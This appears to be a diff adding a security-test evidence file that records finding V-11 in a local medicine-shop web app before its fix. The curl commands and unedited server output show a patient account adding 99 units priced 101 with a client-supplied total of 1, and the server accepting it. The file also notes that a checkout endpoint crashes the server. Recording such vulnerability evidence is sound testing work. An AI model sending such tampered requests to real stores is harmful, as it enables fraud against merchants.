@@ -1,0 +1,38 @@
+V-11 The client decides the price and the server stores it
+==========================================================
+
+state    : BEFORE the fix
+captured : 2026-09-24T17:36:49Z
+branch   : test/it22083500/v11-v15-before-evidence
+commit   : ec2853c
+tool     : curl 8.15.0  (real curl, output unedited)
+target   : http://localhost:4000  (disposable in-memory database, localhost only)
+
+Variables used below (values come from security-tests/.tokens.json):
+  DANA=patientToken=<dana's JWT>    DANA_ID=6ab55fac2afa3227fe052584
+  BOBBY=patientToken=<bobby's JWT>  BOBBY_ID=6ab55fac2afa3227fe052580
+  ALPHA=doctorToken=<Dr Alpha's JWT>  ALPHA_ID=6ab55fad2afa3227fe052588   (Dr Beta's id: 6ab55fad2afa3227fe05258b)
+  MED1=6ab55fad2afa3227fe05258e  MED2=6ab55fad2afa3227fe05258f  CART_ID=6ab55fad2afa3227fe052783  APPT_ID=6ab55fad2afa3227fe052785
+
+------------------------------------------------------------------------------
+STEP 1 — the real price of the medicine, from the server
+$ curl -s "$BASE/api/v1/medicines/get/$MED1"
+{"statusCode":200,"data":{"_id":"6ab55fad2afa3227fe05258e","name":"Testomycin 001","price":101,"description":"Seeded test medicine number 1 for local security testing.","category":"Syrup","manufacturer":"Test Labs 1","expiryDate":"2030-01-01T00:00:00.000Z","stock":50,"image":"https://example.invalid/medicine.png","discount":1,"__v":0,"createdAt":"2026-09-24T17:36:45.393Z","updatedAt":"2026-09-24T17:36:45.393Z"},"message":"Medicine fetched successfully!"}
+
+STEP 2 — logged in as Dana, add 99 of it to her cart with totalPrice 1
+$ curl -s -i -X POST "$BASE/api/v1/medicines-cart/add-to-cart" -H "Cookie: $DANA" -H "Content-Type: application/json" -d "{\"userId\":\"$DANA_ID\",\"medicineId\":\"$MED1\",\"quantity\":99,\"totalPrice\":1,\"status\":\"Pending\"}"
+HTTP/1.1 201 Created
+X-Powered-By: Express
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+Content-Length: 319
+ETag: W/"13f-beeTfC5xK/Up3F/QrhCLj2EXmO0"
+Date: Thu, 24 Sep 2026 17:36:49 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"statusCode":201,"data":{"userId":"6ab55fac2afa3227fe052584","medicineId":"6ab55fad2afa3227fe05258e","quantity":99,"totalPrice":1,"status":"Pending","_id":"6ab55fb12afa3227fe05278d","createdAt":"2026-09-24T17:36:49.817Z","updatedAt":"2026-09-24T17:36:49.817Z","__v":0},"message":"Medicine Added to Cart Successfully!"}
+
+Compare "price" in step 1 with "totalPrice" stored in step 2 (99 x price is the honest total).
+/payment/checkout is not called: it crashes the whole server (V-06).
